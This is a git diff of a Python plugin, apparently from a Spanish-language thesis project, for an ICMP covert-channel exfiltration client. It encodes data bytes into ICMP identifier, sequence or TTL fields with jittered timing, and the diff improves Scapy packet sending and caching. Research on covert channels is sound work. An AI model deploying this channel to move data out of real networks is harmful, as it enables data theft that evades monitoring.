@@ -1,9 +1,20 @@
 from __future__ import annotations
 from typing import Dict, Any, Iterable, Optional
 import time, random
+import os
+import tempfile
 
 from tfg.plugins.api import ExfilClientPlugin
 from .icmp_common import build_header_bytes, iter_bytes_from_chunks, EOT
+
+
+def _prepare_scapy_cache() -> None:
+    # Evita fallos de permisos al crear cache de Scapy en Windows.
+    if os.environ.get("SCAPY_CACHE_FOLDER"):
+        return
+    cache_dir = os.path.join(tempfile.gettempdir(), "scapy-cache")
+    os.makedirs(cache_dir, exist_ok=True)
+    os.environ["SCAPY_CACHE_FOLDER"] = cache_dir
 
 def _sleep_rhythm(base_ms: int, disp_ms: int) -> None:
     if base_ms or disp_ms:
@@ -12,24 +23,33 @@ def _sleep_rhythm(base_ms: int, disp_ms: int) -> None:
         time.sleep(t)
 
 def _send_packet(pkt, iface: Optional[str] = None):
-    from scapy.all import send, sendp, Ether, conf, getmacbyip
+    _prepare_scapy_cache()
+    from scapy.all import send, sendp, Ether, getmacbyip
     if not iface:
         send(pkt, verbose=False)
         return
 
-    old_iface = conf.iface
     try:
-        conf.iface = iface
+        send(pkt, verbose=False, iface=iface)
+        return
+    except Exception as l3_err:
         mac = getmacbyip(pkt.dst)
-    finally:
-        conf.iface = old_iface
-
-    if not mac:
-        raise RuntimeError(f"no se pudo resolver MAC para destino {pkt.dst!r} en iface {iface!r}")
-    sendp(Ether(dst=mac) / pkt, verbose=False, iface=iface)
+        if not mac:
+            raise RuntimeError(
+                f"iface {iface!r} no válida/no encontrada para envío L3 "
+                f"y tampoco se pudo resolver MAC para {pkt.dst!r}"
+            ) from l3_err
+        try:
+            sendp(Ether(dst=mac) / pkt, verbose=False, iface=iface)
+            return
+        except Exception as l2_err:
+            raise RuntimeError(
+                f"falló envío RAW en iface {iface!r}: L3={l3_err!r}; L2={l2_err!r}"
+            ) from l2_err
 
 
 def _send_symbol_identifier(dst: str, b: int, iface: Optional[str] = None, ttl_base: Optional[int] = None):
+    _prepare_scapy_cache()
     from scapy.all import IP, ICMP, RandShort
     ip = IP(dst=dst)
     if ttl_base is not None:
@@ -40,6 +60,7 @@ def _send_symbol_identifier(dst: str, b: int, iface: Optional[str] = None, ttl_b
     _send_packet(ip / ic, iface=iface)
 
 def _send_symbol_sequence(dst: str, b: int, iface: Optional[str] = None, ttl_base: Optional[int] = None):
+    _prepare_scapy_cache()
     from scapy.all import IP, ICMP, RandShort
     ip = IP(dst=dst)
     if ttl_base is not None:
@@ -50,6 +71,7 @@ def _send_symbol_sequence(dst: str, b: int, iface: Optional[str] = None, ttl_bas
     _send_packet(ip / ic, iface=iface)
 
 def _send_symbol_ttl(dst: str, b: int, iface: Optional[str] = None, ttl_base: int = 64):
+    _prepare_scapy_cache()
     from scapy.all import IP, ICMP, RandShort
     ip = IP(dst=dst, ttl=((int(ttl_base) + (b & 0xFF)) & 0xFF) or 1)
     ic = ICMP(type=8, id=RandShort(), seq=RandShort())
